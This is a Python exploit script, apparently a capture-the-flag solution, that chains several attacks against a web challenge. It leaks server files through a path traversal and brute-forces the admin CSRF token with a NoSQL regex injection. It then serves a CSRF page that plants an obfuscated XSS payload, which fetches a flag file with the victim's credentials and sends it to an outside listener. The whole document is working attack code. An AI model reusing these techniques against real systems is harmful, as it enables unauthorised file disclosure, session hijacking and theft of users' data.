import base64

import requests
from flask import Flask, render_template, session, abort, jsonify, redirect, url_for, request, Response


app = Flask(__name__)

#URL = 'http://192.168.15.13:8081'
URL = 'http://de56c704ec79e8ced109.stackchk.fail'

# XXX change to the ip that the challenge can reach you at
#LOCAL = 'http://172.17.0.1:2000'
LOCAL = 'http://104.131.213.67:2000'

session = requests.Session()

if not 'location ^~ /static' in session.get(URL+'/new/etc/nginx/sites-enabled/default').text:
    print '[!] Cound not leak nginx config'
    exit(-1)

print '[+] Leaked nginx config successfully'

if not 'Keeping this here for safe keeping' in session.get(URL+'/static../server.py').text:
    print '[!] Could not leak server source'
    exit(-1)

print '[+] Leaked server source successfully'

r = session.post(URL+'/search',data={'name':'admin'})
admin_id = r.text.split('"/public/')[1].split('/')[0]
print '[+] Admin id is', admin_id

#admin_id = '5d3d3c791d41c848ce1ad473'


leak = ''
for i in range(64):
    for c in '0123456789abcdef':

        r = session.post(URL+'/save',
                json={
                    '_csrf_token':{
                        '$regex':'^'+leak+c+'.*$'
                    },
                    '_id':admin_id
                })
        if r.status_code == 401:
            leak += c
            break

print '[+] Admin CSRF token is', leak

payload = '''
console.log("RUNNING!");
fetch('/files/flag.txt',{credentials: 'include'}).then(x=>x.text()).then(x=>{
    fetch("''' + LOCAL + '''/leak",{
        method:'POST',
        body:'l='+encodeURIComponent(x),
        headers:{'content-type':'application/x-www-form-urlencoded'}
    });
});
'''
payload = base64.b64encode(payload)
xss = '''
if [ <img src=x onerror="eval(atob(`''' + payload + '''`))"> ]; then
'''

@app.route('/go')
def index():
    return '''
<html><body>

<iframe src="http://ad020e420ec0e0f99065.xss.stackchk.fail:8080/"></iframe>

<form action="''' + URL + '''/save" method="POST">
<input name="name" value="xss">
<textarea name="text">''' + xss + '''</textarea>
<input type="hidden" name="_csrf_token" value="''' + leak + '''">
<input type="hidden" name="_id" value="''' + admin_id + '''">
<script>document.forms[0].submit();</script>
</body></html>
'''

@app.route('/leak',methods=['POST'])
def getflag():
    flag = request.form['l']
    flag = flag.split('spellcheck="false">')[1].split('</pre')[0]
    print '\033[1;92m[+] Got flag:',flag,'\033[0m'
    return ''

print "\033[96m[+] Started flask server\033[0m"
print "==== \033[1;92mSEND YOUR TARGET TO %s\033[0m ===="%(LOCAL+'/go')
app.run(port=2000,host='0.0.0.0')

